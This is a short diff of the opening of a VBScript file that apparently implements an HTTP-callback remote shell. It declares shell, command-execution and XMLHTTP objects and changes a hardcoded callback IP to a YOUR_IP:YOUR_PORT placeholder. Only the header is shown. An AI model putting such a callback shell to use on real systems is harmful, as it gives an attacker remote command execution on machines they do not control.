@@ -1,7 +1,7 @@
 Option Explicit
 On Error Resume Next
 
-CONST callbackUrl = "http://172.16.2.125:80/"
+CONST callbackUrl = "http://YOUR_IP:YOUR_PORT/"
 
 Dim xmlHttpReq, shell, execObj, command, break, result
 
